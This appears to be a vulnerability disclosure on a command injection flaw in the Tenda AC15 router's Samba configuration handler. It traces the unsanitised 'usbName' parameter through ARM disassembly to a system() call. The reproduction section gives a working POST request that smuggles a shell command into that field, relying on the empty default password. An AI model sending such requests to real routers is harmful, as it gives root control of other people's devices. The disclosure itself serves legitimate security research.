# [REDACTED-ID]_006: Command Injection in formSetSambaConf via "usbName" Parameter

## Summary

The `formSetSambaConf` handler in Tenda AC15 firmware V15.03.05.19 passes the user-supplied `usbName` HTTP POST parameter directly to `doSystemCmd("cfm post netctrl %d?op=%d,string_info=%s", 51, 3, usbName)` without any sanitization when the `action` parameter equals `del`, enabling arbitrary OS command execution as root.

## Affected Products

| Product | Firmware Version | Architecture |
|---------|-----------------|-------------|
| Tenda AC15 | V15.03.05.19 (EN) | ARM 32-bit |

## Vulnerability Details

### Function: `formSetSambaConf` (vaddr: 0x000a6320, size: 892 bytes)

### Vulnerable Code Path

```
1. 0x000a63cc: websGetVar(wp, "action", "")    -> var_1ch
2. 0x000a63ec: websGetVar(wp, "usbName", "")   -> var_20h (user input)
3. 0x000a64ac: strcmp(action, "del") == 0        -> takes "delete" branch
4. 0x000a64d4: doSystemCmd("cfm post netctrl %d?op=%d,string_info=%s", 51, 3, usbName)
                                                  ^ COMMAND INJECTION
```

There is **zero validation** of the `usbName` parameter between input and command execution.

### Disassembly (ARM)

```asm
; websGetVar(wp, "action", "") -> var_1ch
0x000a63cc: ldr r3, [0x000a66c0]     ; "action"
0x000a63e0: bl  fcn.0002bd4c          ; websGetVar

; websGetVar(wp, "usbName", "") -> var_20h
0x000a6410: ldr r3, [0x000a66c4]     ; "usbName"
0x000a6428: bl  fcn.0002bd4c          ; websGetVar
0x000a642c: str r0, [var_20h]        ; store usbName pointer

; strcmp(action, "del") -- branch taken when action is "del"
0x000a64a4: ldr r3, [0x000a66d4]     ; "del"
0x000a64ac: bl  sym.imp.strcmp
0x000a64b4: cmp r3, 0
0x000a64b8: bne 0xa6510              ; skip if action != "del"

; doSystemCmd("cfm post netctrl %d?op=%d,string_info=%s", 51, 3, usbName)
0x000a64c0: ldr r3, [0x000a66d8]     ; format string address
0x000a64c4: mov r0, r3               ; "cfm post netctrl %d?op=%d,string_info=%s"
0x000a64c8: mov r1, 0x33             ; 51
0x000a64cc: mov r2, 3                ; 3
0x000a64d0: ldr r3, [var_20h]        ; usbName = USER INPUT (UNSANITIZED)
0x000a64d4: bl  sym.imp.doSystemCmd   ; COMMAND INJECTION
```

### Format String

The executed command is:
```
cfm post netctrl 51?op=3,string_info=<ATTACKER_INPUT>
```

Since `doSystemCmd` calls `system()` internally, shell metacharacters in `usbName` (`;`, `|`, `` ` ``, `$()`) will be interpreted by the shell.

### Authentication Requirement

This endpoint requires authentication (it is NOT in the R7WebsSecurityHandler whitelist). However:
- Default admin password is **empty** (`sys.userpass=` in NVRAM defaults)
- Password is stored in **plaintext cookie** (`Set-Cookie: password=%s`)
- Combined with [REDACTED-ID]_003 (shared TLS key), the password can be captured via MITM

### All websGetVar Parameters

| Parameter | Default | Purpose |
|-----------|---------|---------|
| password | admin | Authentication |
| premitEn | (empty) | Permission enable |
| internetPort | (empty) | Internet port config |
| action | (empty) | "del" or "set" |
| **usbName** | **(empty)** | **USB device name -- INJECTED INTO COMMAND** |
| guestpwd | (empty) | Guest password |
| guestuser | (empty) | Guest username |
| guestaccess | (empty) | Guest access control |
| fileCode | (empty) | File encoding |

## Binary Protections

| Protection | Status |
|-----------|--------|
| RELRO | No RELRO |
| Stack Canary | No canary found |
| NX | NX enabled |
| PIE | No PIE |
| FORTIFY | No |

## Impact

- **Remote Code Execution** as root on the router
- Full compromise of the device
- Potential pivot point for LAN attacks
- Persistence through firmware modification

## Reproduction (Conceptual)

```
POST /goform/SetSambaConf HTTP/1.1
Cookie: password=
Content-Type: application/x-www-form-urlencoded

action=del&usbName=test$(id>/tmp/proof)
```

Expected result: The command `cfm post netctrl 51?op=3,string_info=test$(id>/tmp/proof)` is executed via system(), which would execute `id>/tmp/proof` as a subshell command.

## Analysis Method

Static reverse engineering using radare2 on the stripped ARM ELF binary. The vulnerability was identified by:
1. Disassembling `formSetSambaConf` at 0x000a6320
2. Identifying all `fcn.0002bd4c` (websGetVar) calls to extract parameter names
3. Tracing the `usbName` parameter (var_20h) to the `doSystemCmd` call at 0x000a64d4
4. Confirming no validation exists between input and sink

## References

- Binary: `firmware/binaries/httpd_ac15` (ARM 32-bit, stripped)
- Evidence: `evidence/phase4_targeted_r2_analysis.json`
